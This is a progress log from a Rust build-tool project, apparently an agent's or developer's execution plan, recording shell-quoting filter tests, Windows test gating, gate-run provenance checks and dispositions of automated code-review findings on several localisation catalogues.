    EP-M4's query-surface obligation pins the agreement instead of closing the
    gap. See the corresponding `Surprises & discoveries` entry, which records
    how a measurement that appeared to settle this could not reach it.

    `src/runner/tests/shell_seam_tests.rs` (six cases) is the acceptance
    evidence, and its negative control was run rather than argued. Reverting
    only the plumbing — deleting `.with_recipe_shell(recipe_shell)` from the
    build seam in `src/manifest/query.rs` while leaving
    `StdlibConfig::with_recipe_shell` and `recipe_text` intact — left the suite
    at 5 passed, 1 failed:

    ```text
    running 6 tests
    test runner::tests::shell_seam_tests::build_loader_quotes_for_the_resolved_posix_shell::case_1 ... ok
    test runner::tests::shell_seam_tests::shell_join_is_registered_on_the_build_surface ... ok
    test runner::tests::shell_seam_tests::build_loader_quotes_for_the_resolved_posix_shell::case_2 ... ok
    test runner::tests::shell_seam_tests::omitted_dialect_follows_the_loader_shell ... FAILED
    test runner::tests::shell_seam_tests::bash_and_posix_render_identically_through_the_loader ... ok
    test runner::tests::shell_seam_tests::an_unknown_dialect_is_rejected_with_its_code ... ok

    failures:

    ---- runner::tests::shell_seam_tests::omitted_dialect_follows_the_loader_shell stdout ----
    Error: the default dialect did not follow the loader; both rendered "a' b'"

    test result: FAILED. 5 passed; 1 failed; 0 ignored; 0 measured; 1433 filtered out; finished in 0.01s
    ```

    The five survivors are the point of the exercise, not a gap. Every one of
    them names its dialect explicitly, so none of them *should* notice reverted
    plumbing — and they did not. Only `omitted_dialect_follows_the_loader_shell`,
    which asks the same template of two different loaders and requires the two
    to disagree, can see the difference. That is what makes it the load-bearing
    assertion, and it is why the suite is written so that exactly one case
    carries the burden: a suite where every case failed on a revert could not
    distinguish "the plumbing is missing" from "the filters are broken".

    The compile also produced one warning during the control — `unused_variables`
    on the now-ignored `recipe_shell` field — which is a useful independent
    signal that the field is genuinely threaded rather than merely present.
    Restoring the line returned the suite to 6 passed.

- [x] (2026-09-27) EP-M4 `shell_quote` and `shell_join` — the red tests, the
    filters, the BDD scenarios, the query surface, and the documentation
    note. Four commits, each gated before the next: `43d9f24c`
    (`shell_filter_property_tests`), `e097c3f3`
    (`shell_filter_composition_tests`), `ac36f7ab` (the eight `shell_*`
    scenarios in `tests/features/stdlib.feature`), `fbcfd046` (the two
    query-surface contracts plus `cargo fmt` repairs to three sources left
    unformatted by earlier commits), and `668080db`
    (`docs/developers-guide.md`).

    Two plan defects were found and corrected rather than implemented, both
    recorded in `Surprises & discoveries`. The query surface's "deliberate
    divergence" does not exist: `resolve_recipe_shell_with` returns `Posix`
    before reading the environment on Unix, and `execute_help` returns before
    `resolve_recipe_shell()` on Windows, so `register_query_helpers`' use of
    `RecipeShell::host_default` is identical to the build surface's and no
    host can observe a difference. The obligation was rewritten to pin the
    agreement, and the guide documents why threading the resolution through
    would be a regression (it hoists a fallible environment read above an
    early return, so a malformed `NETSUKE_WINDOWS_SHELL` would start failing
    a metadata query that executes nothing). The plan's `shell_quote`
    scenario also could not be written as drafted: `:string` step captures
    strip their delimiters without unescaping, so the drafted `\"` reached
    MiniJinja raw. It was respelt with a single-quoted Jinja string, which
    renders the drafted expected value verbatim.

    Every obligation has a negative control that was run, not argued. The
    query-surface test went 6/6 green against a `RecipeShell::PowerShell`
    seed before it was believed, which is how the fixture's two dead
    assertions (an inverted guard and a membership test satisfied by the seed
    itself) were found; with the trio design the same seed fails. The
    `.feature`-only rebuild gap was found the same way — the harness re-runs
    the previously compiled scenarios, so the touch is part of the loop.

    Suite state at the last full run: 344 passed across
    `stdlib_manifest_query_tests` (6), `shell_filter_property_tests` (44),
    `shell_filter_composition_tests` (13) and `bdd_tests` (281), in 5.8 s.

- [x] EP-M4 close-out: the Windows merge gate the Linux gates cannot see.

  `make test` on this host reports 3554 tests run, 3554 passed, 5 skipped, and
  the property suite alone is 44/44 — the same count the plan recorded before
  the split, so the extraction lost no coverage. Neither number says anything
  about Windows, and CI said something different:
  `Windows / build-test-windows` was failing on `45b2fd87` and `d11ad3bb` on
  `sh_quoting_round_trips_through_a_real_shell` with
  `no POSIX shell available`. That is CodeRabbit finding #6, which an earlier
  pass had set aside on the grounds that the finding's *arithmetic* was wrong;
  the arithmetic was an aside and the substance was right. The test was also
  not inherited from `main` — `tests/shell_filter_property_tests.rs` does not
  exist there and was added by this branch at `43d9f24c` — so this was this
  branch's own regression, not a pre-existing defect.

  The obligation is now `#[cfg(unix)]`, which is what the plan specified for it
  all along: "property test executing a real `/bin/sh` subprocess,
  `#[cfg(unix)]`". Gating it there rather than leaving the
  `TestCaseError::fail` in place is the point — a host that cannot run a test
  must not report it as failed, because no change to the code under test can
  make that green.

  The cascade is the part worth recording, and the local probe found all of it
  before CI did. Gating the `proptest!` block turned four further items into
  errors on the non-Unix tree: two now-unused imports in the round-trip module
  (the `posix_shell`/`decode_through_posix_shell` pair the property used),
  three helpers in `property_support` that are reachable *only* from Unix-gated
  suites (`posix_shell`, `run_posix_shell`, `decode_through_posix_shell`) and
  so become dead code, and — once those were gated — the `ensure!` macro they
  were the last users of. The imports each need `#[cfg(unix)]` as well, and for
  a sharper reason than the unused-import error: naming an item that is itself
  `#[cfg(unix)]` from an ungated `use` does not resolve at all.

  Verified against the pre-image rather than argued: the non-Unix tree compiles
  clean under
  `RUSTFLAGS="-D warnings" cargo check --test
  shell_filter_property_tests --all-features`
  with the gates swapped, and the same invocation with a deliberate unused
  import appended fails with exit 101, so the green result is a measurement and
  not an oracle that was never consulted. The Linux side re-runs 44/44 with the
  gates restored.

- [x] EP-M5 documentation, ADR-041, roadmap tick. Verified present rather than
      assumed: `docs/adr-041-canonical-recipe-shell-quoting-surface.md` is
      `Accepted` dated 2026-09-27, `docs/roadmap.md:367` carries
      `- [x] 3.14.8`, and `docs/users-guide.md:518-521` documents
      `shell_quote`/`shell_join` including the `dialect` argument.

- [x] (2026-09-27) CodeRabbit review at `8d0db5b3` triaged; all five findings
      dispositioned against the tree rather than the reviewer's framing.

  **What the review actually was.** Two separate review artefacts, and the
  distinction matters because only one of them is on the pull request. The
  *posted* review `5328262147` (`CHANGES_REQUESTED`, pinned to `94b9b247`)
  carries exactly two inline comments: the `compact` predicate at
  `src/stdlib/collections.rs:106` and an en-GB-oxendict spelling in
  `tests/std_filter_tests/collection_filters/compact_property.rs:91` (the
  British `-ise` form of *recognize*, which `typos.toml` rewrites by rule, so
  the offending word is described here rather than quoted back into a file the
  gate reads). Both were already fixed at HEAD, and by two different commits:
  the predicate by `fc967d91` ("Keep an empty byte array out of `compact`'s
  blank set") and the spelling by `338df305` ("Clear the lint cascade and the
  spelling sweep"). Neither was written in response to this review — the
  predicate was correctness work and the spelling fell out of the
  en-GB-oxendict sweep — which is the point: the review is pinned to `94b9b247`
  and reports a tree HEAD has since moved past twice. The *five* findings
  triaged here come from the local `coderabbit review --agent` run captured at
  `/tmp/coderabbit-c72b2360-…-3-14-8-jinja-command-helpers-to-match-documented-ergonomics.out`,
  which is a different artefact with a different file scope (its
  `reviewedFiles` list runs to 107 entries and includes files this branch never
  touched). Reading the posted review as if it were the local one, or vice
  versa, would have led to "fixing" two already-fixed items and losing three
  live ones.

  **Dispositions.** Three fixed, two declined.

  1. *`tests/stdlib_manifest_query_tests.rs:35-53`, unescaped YAML
     interpolation* (trivial) — **fixed.** `write_description_manifest` spliced
     `template` raw into `"    description: \"{template}\"\n"`, so a template
     containing a `"` would close the scalar early and spill the remainder into
     the document as YAML. Latent rather than live — every current caller passes
     single quotes, and `PROBES` contains no `"` — but the failure mode is the
     bad one for a *test*: the manifest would still parse, so a probe could be
     satisfied by a document that never rendered the template it names. Now
     encoded with `serde_yaml::to_string` (already a dev-dependency, used by six
     other test files), which also keeps this test's own escaping out of the set
     of things a failing probe could be blamed on.
  2. *`tests/stdlib_manifest_query_tests.rs:1-400`, extract the probes*
     (trivial) — **split applied; the `pub(crate)` half of the instruction
     declined as unnecessary.** The file was exactly 400 lines, and the
     `module_max_lines` cap is `lines > limit`, so it passed with zero
     headroom. The probe block (196 lines) is now
     `tests/stdlib_manifest_query_tests/dialect_probes.rs`, reached by an
     explicit `#[path]` from the 220-line crate root. The reviewer's claim that
     `run_query` must become `pub(crate)` for the child to reach it is **wrong**:
     a descendant module resolves its ancestors' private items directly. The
     compiler proved it during the split — before the `use` line was added, the
     diagnostic was `cannot find function assert_full_stdlib_renders in this
     scope`, resolved by `use super::{assert_full_stdlib_renders, run_query};`
     with no visibility change at all. Adding `pub(crate)` would have widened
     the surface to buy nothing. The split's own hazards were checked rather
     than assumed: `#[path]` disarms `clippy::self_named_module_files`
     (precedent: `tests/makefile_test_target.rs` +
     `tests/makefile_test_target/*.rs`, every child declared the same way), and
     `orphaned_module_trees` skips any directory without its own `mod.rs`, so a
     plain `.rs` child is invisible to it. The moved body was verified
     byte-identical to the original lines 205-400 by `sha256sum` before and
     after, and both tests report under their new path (`dialect_probes::…`),
     which is what proves the child compiles and runs rather than being silently
     skipped.
  3. *`locales/gd/messages.ftl:294`, `beit` for `baidht`* (minor) — **fixed.**
     Valid, and the inconsistency was introduced by this branch's own
     `7b55b322` (`git log --no-ext-diff -S "luach le beit neoni"`). Measured
     across the whole catalogue: HEAD carried `baidht`×6, `beitean`×3, `beit`×1,
     against `baidht`×6, `beitean`×3 on `origin/main` — so `beit` was a third
     variant, not a defensible lenited or singular form. The Gaelic paradigm is
     `baidht` (singular) / `beitean` (plural), and the surroundings call for the
     singular. Now `baidht`×7, `beit`×0. Lenition is not applied to this noun
     anywhere: `bhaidht` appears in 0 of 35 catalogues, so line 294 now agrees
     with the six other uses instead of introducing a form nothing else uses.
  4. *`locales/id/messages.ftl:294`, `retur kereta`* (minor) — **declined.**
     The reviewer asks for `karakter CR` on the grounds that the current term
     is not unambiguously readable as "carriage return". The wording is
     genuinely awkward Indonesian, but it is the established form of a
     **project-wide family**, which is what settles it.

     Measured across all 35 catalogues, "carriage return" is rendered as a
     calque or loan in every one; none uses an abbreviation. Four locales share
     `id`'s construction of a carriage word plus a `retur` word: `ro`
     `retur de car`, `da` `vognretur`, `nb` `vognretur`, `sv` `vagnretur`.
     Romanian is the sharpest case because it carries the *same two-message
     family in the same shape* — `stdlib.command.quote.line_break` (line 277)
     and `stdlib.shell.quote.control_character` (line 294) — so `id`'s pairing
     is not an `id` defect but the family's ordinary form. **`CR` appears in
     0 of 35 catalogues.**

     Against that, `karakter CR` would be a one-locale abbreviation introduced
     into a family with a settled shape. And the finding cannot be applied
     locally: the same wording already ships at
     `stdlib.command.quote.line_break` (line 277 here, line 275 on
     `origin/main`, untouched by this branch), and the styleguide requires
     message families to stay parallel. Changing only the new line would leave
     two `id` messages describing the same control characters in two
     vocabularies; changing both would edit a line `origin/main` owns and this
     branch has no other reason to touch. Neither is worth a wording
     preference, so the disposition is "move both or not at all", and the
     reasoning is recorded here rather than actioned. Should a later locale
     pass adopt `karakter CR`, it should move both lines together.
  5. *`docs/localization-glossary.md:1217`, `keyword` argument* (minor) —
     **fixed.** Valid and a real defect: the row read "the `keyword` argument of
     `shell_quote`/`shell_join` takes this term", but neither filter has a
     `keyword` argument — `dialect` is the only option either takes, and it is
     keyword-only. The row was added in `57d733b4` and described the filters
     wrongly. The row now names `stdlib.shell.positional_option` as the message
     that carries the concept, which is checkable and true: en-GB line 299 reads
     "`{ $filter }` takes its options by keyword", and gd line 299 renders it
     with `facal-luirg`. The replacement was written to the table's 314-column
     width rather than left for `mdtablefix` to re-pad, which is the lesson the
     preceding entry records.

  **The pull-request state is not approval, and was checked rather than
  assumed.** The CodeRabbit app is **auto-paused** on this branch, so its
  `success` status on `8d0db5b3` reads "Review paused" and is a pause
  indicator, not a review outcome. The stale `CHANGES_REQUESTED` review
  `5328262147` remains pinned to `94b9b247` and will keep reporting until it is
  dismissed or the app is resumed. The pull request is `MERGEABLE` with
  `mergeStateStatus: BLOCKED`, the block being the pending required check
  `build-test`. None of that is a substitute for the deterministic gates, which
  is why the fixes above are gated before any re-review is requested.

- [x] (2026-09-27) The gate run at `fbbeeeb7` found one failure, in the split
      this entry describes: a trailing blank line after the root file's final
      `}`, rejected by `cargo fmt --all -- --check`. Fixed in `10b76e45`.

  **Why it is worth recording.**
  `cargo check --test stdlib_manifest_query_tests` passed, the six tests
  passed, and `make lint` passed — the file was correct by every measure except
  the one gate that reads trailing whitespace. Removing one line from the end
  of a file is exactly the edit a line-oriented split invites, and
  `sed -n '1,220p'` produced it by keeping the separator blank line that had
  followed the last block. **A file split is a formatting change, not just a
  move**, so the formatting gate has to see it; a compile-and-test check cannot.

  **A second shape worth naming.** The gate logs for this run record
  `SHA_BEFORE=fbbeeeb7` on every line but `SHA_AFTER=0ac808fa` on `lint`,
  because the documentation-correction commit landed while the run was in
  flight. The logs are honest — they record both — but a reader scanning only
  `SHA_BEFORE` would attribute a `lint` result to the wrong tree. Any commit
  made during a gate run invalidates that run's provenance, even when the delta
  is harmless; the whole set must be re-run against the final HEAD.

- [x] (2026-09-27) The re-run at `890a657f` found two more defects, both in
      **this document** and both introduced by the disposition entry itself:
      `mdtablefix --check` rejected three paragraphs for re-wrapping, and
      `markdownlint` reported MD038 at line 2886 on a code span reading
      `` ` le b` ``. Fixed in the same commit as this entry.

  **Why the code span was broken, and why the repair is not cosmetic.** The
  span was written to name the Gaelic lenition context and lost a leading
  grapheme, leaving a space inside the backticks. But the claim it carried was
  also unverifiable as written: *every* `le b` context is followed by a `b` by
  construction, so "the only `le b` context is a following `b`" is a tautology
  and not a measurement. The repaired text states something checkable instead —
  `bhaidht` appears in 0 of 35 catalogues, so line 294 agrees with the six
  other uses of `baidht` rather than introducing a form nothing else uses.

  **A `--wrap` refill is a formatting change that a reader cannot see.**
  `mdtablefix --check` failing with `+13 -14` does not mean 13 wrong lines: it
  means the paragraph's fill point drifted. All three hunks moved text
  *between* lines without changing a word, which is why the prose read
  correctly while the gate was red. The diff is the only artefact that shows
  it, so the check has to be run before the commit rather than reasoned about.

  **Both defects were in a document, and both were caught by Markdown gates.**
  Nothing in `cargo check`, `make lint`, `make typecheck`, or `make test` reads
  prose wrapping or code-span interiors, and all four passed on the same tree
  (3578/3578 tests green). This is the second time on this branch that a
  prose-only edit was invisible to every non-Markdown gate — the first being the
  `sed -n '1,220p'` trailing blank line. `make check-fmt` and
  `make markdownlint` are the only two gates with jurisdiction here, and they
  are not optional on a documentation commit.

- [x] (2026-09-27) The seven-gate set is green at `bb6bfa49`, and that commit is
      pushed. The push then exposed a **separate, advisory** concern:
      `CodeScene Code Health Review (main)` had been failing on this branch for
      its last six heads, on `tests/shell_filter_property_tests/property_support.rs`
      — a file added by `6f41c6f3`, which was already on the branch before the
      five commits this entry describes. Reproduced locally and dispositioned
      as an exemption in `.codescene/code-health-rules.json`.

  **The finding is real, and it is not fixable by refactoring.** `cs delta`
  reports `String Heavy Function Arguments`, 75.0% of arguments to 10 functions
  being strings against a 39.0% threshold. Independent counting of the file's
  `pub(super) fn` signatures agrees exactly: 9 `&str` of 12 parameters, 10
  functions. The tempting remedy is to type the `dialect: &str` selectors as
  `RecipeShell`, which is what production stores
  (`src/stdlib/config/recipe_shell.rs`). Measured, that is not enough: typing
  both selectors that take one moves the ratio 75.0% → 58.3%. Even typing all
  three dialect-bearing parameters only reaches 50.0%, because six of the
  twelve parameters take adversarial text *by design* — an unconstrained
  template, a shell word drawn from a metacharacter alphabet, the encoder's
  output read back through a POSIX shell, a PowerShell literal to decode, a
  script to run. A harness whose subject matter is text the filters must not
  assume well-formed cannot reach 39% while still testing what it exists to
  test.

  **Why an exemption rather than a refactor.** CodeScene names the missing
  domain language as the defect, and here the strings *are* the domain: the
  suite's whole purpose is to hand the filters inputs that are not well-formed
  words. The repository already carries this exact rule, at weight 0.0, for
  `src/ir/cmd_interpolate_property_support.rs` — a file of the same shape, whose
  `matching_content_path_doc` gives the same reason (private test-only
  strategies and oracles over deliberately adversarial values). The new entry
  follows that precedent and its documented convention that each rule set be
  narrowly scoped and justified in `matching_content_path_doc`. It is scoped to
  one 200-line file, added by a 10-line purely additive JSON edit, and it
  states the measured alternative rather than asserting that none exists.

  **This concern does not gate the branch.** The `main-required-checks` ruleset
  (`18427981`) requires exactly `build-test`, `kani-smoke`, `netsukefile`, and
  `release / metadata`, all four of which passed. Code health is advisory here.
  It is recorded because it is branch-specific rather than repo-wide noise —
  `cs delta` is PR-scoped, and a survey of the other open pull requests found
  10 of 11 passing it, so dismissing it as background would have been wrong.

- [x] (2026-09-27) The seven-gate set is green again at `b9e23191`, and that
      commit is pushed. This is the third full run on this branch; the two
      before it were invalidated, the first by a `cargo fmt` defect and the
      second by a mid-run commit.

  `SHA_BEFORE == SHA_AFTER == b9e2319197865d0a92aafbd169e794493602d3aa` on all
  seven gates, every one `EXIT=0`. `test` ran 3578 nextest tests (3578 passed,
  5 skipped) plus both doctest targets; `doc-coverage` measured 4815/4872 =
  98.83% against an 80.00% threshold; `markdownlint` reported 0 errors over 167
  files. The five skipped tests correlate exactly with the five `#[ignore]`
  attributes in the sources, so none is a silently disabled gate.

  **A log-naming hazard worth recording.** The gate runner writes to
  `/tmp/<action>-<project>-<branch>.out`, which is keyed by *branch* and not by
  revision. Three families of stale log now sit in `/tmp` for this one branch —
  the uppercase `CHECK-FMT`-style set from an earlier run, a `peer-0828-*` set,
  and a `peer-stale8d0db5b3-*` set whose `.out.meta` sidecars record a
  `head_before` that is not this branch's HEAD at all. A reader who greps for
  the branch name gets every one of them and can easily cite a green result
  from a tree that no longer exists. The current run's own logs are
  distinguishable only by their run prefix and mtime, which is exactly the
  provenance gap the `SHA_BEFORE`/`SHA_AFTER` trailer closes from the inside.
  Cite the trailer, not the filename.

- [x] (2026-09-27) Six further CodeRabbit findings triaged at `b9e23191`; one
      fixed, five declined. The fix is a single Korean particle; every decline
      is backed by a count against `origin/main` rather than a preference.

  **Dispositions.** One fixed, five declined.

  1. *`locales/ko/messages.ftl:356`, `compact은` for `compact는`* (minor) —
     **fixed.** Valid. `compact` is transliterated 컴팩트, whose final syllable
     트 carries no 받침, so the topic marker is 는. The finding is confirmed by
     the catalogue's own arithmetic rather than by consulting a grammar: a
     sweep of every Latin identifier bearing a bare (unhedged) particle in this
     file returns **17 sites**, and line 356 was the **only one** that
     disagreed with the 받침 rule. Fourteen others are correct by inspection —
     `Netsuke는` (트-final), `Ninja를` (자-final, no 받침), `JSON을` (엔-final),
     `YAML은` (엘-final, has 받침), `glob이` (브-final), `group_by가`,
     `timedelta가`, `cwd_mode는`. The decisive comparison is the sibling at line
     143, `default는`: `default` is 디폴트 and `compact` is 컴팩트, both
     트-final, both therefore take 는 — so 143 and 356 are the same
     phonological class and could not both be right. 143 is branch-added too
     (`e453322c`, EP-M1) and is the correct member of the pair, which is why
     the repair moved 356 toward 143 and not the reverse.

     The catalogue also has a **second, older convention** for exactly this
     situation, and the choice between them was made on counts. An identifier
     bearing a particle is written with a hedge in **58 places on
     `origin/main`** (은(는)×15, 이(가)×20, 을(를)×23), including both of this
     branch's own `stdlib.shell` lines — 293 `shell_quote은(는)` and 297
     `shell_join은(는)`, which are line 356's sentence with a different
     identifier substituted. The hedge is the safer form because it cannot be
     wrong, and it was the candidate the triage recommended. It was **not**
     taken: of the 17 bare-particle sites the sweep returns, **8** use 은/는,
     and the two that frame line 356 — the main-owned 355 (`flatten은`, line 341
     on `origin/main`) and this branch's own 143 (`default는`) — are both
     unhedged and both correct. Line 355 is 356's immediate sibling in the same
     `stdlib.collections` block and shares its sentence shape. Only **2** of the
     8 은/는 sites are branch-added at all (143 and 356); the other **6** are
     main-owned. Hedging 356 alone would make two adjacent lines describing the
     same filter family disagree in form, and hedging all eight would edit six
     main-owned lines for no defect. So the minimal correct repair is
     the particle itself, and the hedge is recorded here as the alternative a
     later locale pass may prefer. Note that no document states a rule either
     way — `docs/localization-glossary.md` covers spacing (띄어쓰기), loanword
     orthography, and false friends for Korean, but says nothing about particle
     selection — so the 17-site sweep, not a citation, is what settles it.
  2. *`locales/hi/messages.ftl:294`, `गाड़ी वापसी` for `कैरिज रिटर्न`
     (carriage return)* (minor) — **declined.** The requested form
     `कैरिज रिटर्न` appears in **0** of 35 catalogues. `गाड़ी वापसी` is the
     branch's calque and reads as a literal "cart return", but the finding
     cannot be applied locally: the identical wording already ships at
     `stdlib.command.quote.line_break`, which is **main-owned** — line 274 on
     `origin/main`, untouched by this branch, and line 277 here only because
     the branch's own insertions shifted it down. This is the same
     "move both or not at all" disposition as the Indonesian finding recorded
     above, and for the same reason: changing only the new line would leave two
     Hindi messages describing the same control characters in two vocabularies,
     while changing both would edit a line this branch has no other reason to
     touch. (Because `grep -c` is unreliable on these Unicode catalogues — it
     returned 0 for text that was visibly present — the counts here come from
     Python's `str.count()`: HEAD 2, `origin/main` 1.)
  3. *`locales/ru/messages.ftl:143`, `получено` agreement* (minor) —
     **declined.** The reviewer reads `получено { $kind }` as a predicate
     agreeing with a missing subject. It is an **impersonal passive** — "it was
     received" — which takes no accusative object and therefore no agreement at
     all, so there is no number or gender for it to get wrong. The placeholder
     also does not supply one: `{ $kind }` renders MiniJinja's own `ValueKind`
     labels, which are Latin and indeclinable (`string`, `number`, `sequence`).
     And the construction is not this branch's invention: `origin/main` uses
     `получено` immediately followed by a placeable in **4** places (lines 154,
     182, 229, 367), and `получено` never once appears followed by a Cyrillic
     word — so the new line reproduces a main-owned pattern exactly.
  4. *`locales/uk/messages.ftl:143`, `отримано` agreement* (minor) —
     **declined**, for the reasons in finding 3, which the reviewer raised
     separately for the Ukrainian catalogue. `отримано { $placeable }` occurs
     **4** times on `origin/main` (the same four lines), and `отримано` is
     likewise never followed by a Cyrillic word there.
  5. *`locales/ru/messages.ftl:143`, duplicate of finding 3* (minor) —
     **declined as a duplicate.** Same line, same requested change, filed
     against the same message key; the second occurrence adds no new evidence.
  6. *`locales/uk/messages.ftl:143`, duplicate of finding 4* (minor) —
     **declined as a duplicate**, as above.

  **One of the declines rests on a distinction the reviewer could not see from
  the line alone.** Findings 3-6 all target the *same* placeholder substitution
  that findings 1 and 2 do not: `{ $kind }` is not a translated noun but a
  runtime type label. That is why "the participle must agree with it" is not a
  near-miss but a category error — there is no Slavic noun in the rendered
  string at all. The same reasoning applies to the `을(를)` hedge on the Korean
  line 356 that finding 1's sentence contains, and to the 28 `을(를)` hedges in
  this catalogue: every one of them marks an object whose identity is only
  known at render time, which is precisely why the hedge exists rather than a
  chosen particle. Recorded because the shape recurs — a finding that reads a
  placeholder as if it were prose will keep proposing agreement rules for
  values that have no grammatical features to agree with.

- [x] (2026-09-27) The seven-gate set is green at `c3078c1f`, the Korean repair
      and the dispositions committed and pushed. Fourth full run on this branch.

  `SHA_BEFORE == SHA_AFTER == c3078c1f4e8c5cac9bab04f778aaa75991378532` on all
  seven gates, every one `EXIT=0` and `PROVENANCE=valid`, with
  `git status --porcelain` empty before and after each. `test` ran 3578 nextest
  tests (3578 passed, 5 skipped) across 108 binaries plus **both** doctest
  targets (129 passed, 32 ignored, 0 failed — the two-target count confirmed
  rather than assumed); `doc-coverage` 4815/4872 = 98.83% against the 80.00%
  threshold; `markdownlint` 0 errors over 167 files; `nixie` 168 files.

  **The run caught a self-inflicted provenance defect, and that is the entry's
  real content.** Two seconds after `check-fmt` finished, I edited this very
  document to tick a stale checkbox — with the gate run still in flight. The
  runner's own trailer recorded `DIRTY_BEFORE=1` on `make lint` without being
  told, which is the check working as designed; `SHA_BEFORE == SHA_AFTER` still
  held, because HEAD had not moved, so the defect was working-tree-only and the
  gate's verdict survived. I reverted the edit with `git checkout --`, saved it
  to a patch outside the repository, and re-applied it afterwards, so the run's
  provenance now covers exactly the commit it cites.

  Three things this is worth recording for. **First**, the failure mode is
  milder than the one the earlier entries describe — a dirty working tree does
  not invalidate a gate whose stages never read the dirty file, and `lint`'s
  stages (`cargo doc`, clippy, whitaker, ruff, pylint, yamllint, actionlint)
  read no Markdown at all. That was verified from the log rather than assumed.
  **Second**, the distinction between *HEAD moving* and *the working tree
  changing* is what decides whether a run is invalidated, and only the first is
  caught by a `SHA_BEFORE`/`SHA_AFTER` comparison; the `DIRTY_*` trailer is
  what closes the second, which is why it earns its place. **Third**, the
  correct order is to freeze the tree *before* summoning the gate runner, not
  to reason afterwards about whether a mid-run edit mattered. Had the edit
  landed before `check-fmt`'s start, or had it touched a file that
  `markdownlint` or `mdtablefix` reads, the whole set would have had to be
  re-run; the cheap insurance is to commit or revert first and ask questions
  later.

  **The checkbox was stale, and re-verifying it was the point.** The unticked
  box described a completed repair pass whose end state I confirmed against the
  tree rather than the entry's own prose: `recorded_render` is
  `src/observability_recorder_dialect_tests.rs:38`, returns
  `Result<Vec<SnapshotEntry>>`, and propagates its fallible steps with `?`. Its
  callers unwrap at their own sites inside recognized test functions, which is
  what the whitaker rule requires — and which is a *positional* requirement,
  not a module-scoped one: `src/observability.rs:173` gates the parent module
  with `#[cfg(test)]` and reaches the child through `#[path]`, so the helper
  compiles only under `cfg(test)` yet is not itself "a test" for lint purposes.
  A `tests/`-scoped search finds no trace of it, because it lives under `src/`;
  that is the likely reason the box went unticked, and it is the same
  `#[path]`-under-`src/` shape recorded earlier for the Whitaker test-module
  split.

- [x] (2026-09-27) The seven-gate set is green at `323169b4`, and the tree was
      frozen before the runner was summoned rather than after.

  `SHA_BEFORE == SHA_AFTER == 323169b46bcf2dd9c80a04be73365a0fec8f7aee` on all
  seven gates, every one `EXIT=0`, `PROVENANCE=valid`, and — the point of this
  run — `DIRTY_BEFORE = DIRTY_AFTER = 0` on every one, confirmed still clean
  after the final gate. This is the first run on this branch with no provenance
  caveat attached. `check-fmt` exercised all three stages including the
  `mdtablefix --wrap` refill, which the preceding entry's edit had made
  necessary: `167 files left unchanged`. `test` ran 3578/3578 nextest (5
  skipped) plus the doctest targets, and `doc-coverage` held 98.83%.

  **The sequencing fix is the content here.** The previous entry records
  dirtying the tree two seconds into a run; this one is the correction applied
  as practice rather than as resolution — the edit was committed first, the
  tree confirmed empty with `git status --porcelain`, and only then was the
  runner started. That is cheaper than the alternative in both directions: no
  reverted edit to re-apply, and no judgement call afterwards about whether a
  mid-run change mattered.

  **One honest limit on what this run proves, stated because the runner raised
  it.** The delta is Markdown-only, so `lint` and `test` exercised build
  artefacts cached from `c3078c1f` rather than recompiling cold. That is
  expected and correct for a documentation commit — the Rust tree is unchanged
  from `c3078c1f`, which was itself verified green on the same seven gates, and
  the Rust-bearing commits behind it were gated in their turn. But this run is
  not fresh evidence that the Rust tree compiles from cold, and it should not
  be cited as such.

- [x] (2026-09-27) The CodeRabbit review at `75e0b671` triaged; ten findings
      applied and seven declined, two of the declines being the same request
      filed twice. One finding — the query/build divergence — was upheld against
      this plan's own text, and correcting it took three passes before every
      site was covered.

  **Dispositions.** 17 raw findings, 15 distinct: findings 11 and 15 are one
  German request filed twice against the same line, and 10 and 16 one Czech
  request. Items are keyed to the review's own numbering, taken from its JSONL
  log. Of the seven declined, five are distinct — the Indonesian wording
  request, findings 5 and 6 against `dialect_probes.rs`, and the Czech and
  German case-frame pair — and two are the *second filing* of a finding whose
  first filing was also declined, so no distinct request is double-counted on
  either side. `coderabbit review --agent` ran for 877 s, exit 0,
  `review_completed`, no rate limiting (5 of 10 quota units spent), while the
  GitHub app remained **auto-paused** on this branch — its `success` status on
  `75e0b671` reads "Review paused", which is a pause indicator and not a
  verdict.

  1. *`locales/id/messages.ftl:294`, `retur kereta` → `karakter CR`* —
     **declined, and already declined once.** The requested string appears in
     **0** of 35 catalogues; the Indonesian catalogue simply names the control
     characters differently. Rewording the new line alone would leave two
     Indonesian messages describing the same characters in two vocabularies, and
     the alternative rewrites `stdlib.command.quote.line_break`, a **main-owned**
     line (275 on `origin/main`; 277 here only because this branch's insertions
     shifted it) that this branch has no other reason to touch.
  2. -
     `tests/shell_filter_property_tests/round_trip_through_an_oracle.rs:100-106`,
     `RefCell` in a doc comment where the code uses `Cell`* — **fixed.** Valid,
     and a real simplification rather than a style note: the closure passed to
     `TestRunner::run` is an `Fn`, so nothing can hold a mutable borrow across
     calls. `Corpus` is already `Copy`, which is what makes the cell available.
  3. *`tests/std_filter_tests/collection_filters/compact_property.rs:40-43`,
     `is_droppable` should gate on `ValueKind::String`* — **fixed, and this is
     the finding a prior triage wrongly called a category error.** The earlier
     ruling held that the oracle "mirrors prod code without the doc rationale"
     and that the generator emits no bytes, so the guard was unnecessary. The
     first half is true and is not a defence: `stdlib::collections::is_blank`
     gained exactly that guard, so an oracle without it restates the *old*
     predicate and would accept a regression to it. The second half was false —
     `member()` had no bytes arm, which is *why* the gap was invisible. Both are
     closed: the guard matches production, and a `Value::from_bytes(Vec::new())`
     arm puts the value in the corpus. **Falsified live:** with the guard removed
     and the arm present, the property fails on the minimal input `[b'']` with
     "compact must not emit a blank member"; restored, 2/2 pass.
  4. *`src/runner/tests/shell_seam_tests.rs:49-54`, doc describes a template
     that
     no longer exists* — **fixed.** Valid: two filters and embedded single
     quotes, where the constant is one pinned `shell_quote` call. The replacement
     states what the constant is and, importantly, what it does *not* prove —
     with the dialect pinned the case cannot show the *resolved* interpreter
     reaches the filters, and `omitted_dialect_follows_the_loader_shell` is
     named as the half that can.
  5. *`tests/stdlib_manifest_query_tests/dialect_probes.rs:124-126`, drop the
     claim that a malformed `NETSUKE_WINDOWS_SHELL` is unreachable "either way"*
     — **declined; the existing comment was falsified instead.** The finding is
     right that the old comment's Windows branch was a guess, but its replacement
     explanation is wrong: on Windows `resolve_recipe_shell_with` has no `cfg`
     early return, yet `execute_help` returns first (`:153`), so the query never
     resolves a shell there either. The hazard the comment is about is
     conditional — it describes what *would* happen if the resolution were hoisted
     above that return — so a claim that it cannot occur is not something either
     branch can settle by reading. The comment now states the mechanism rather
     than a reachability verdict, and the note that the divergence is masked was
     kept, which is the part the finding asked to preserve.
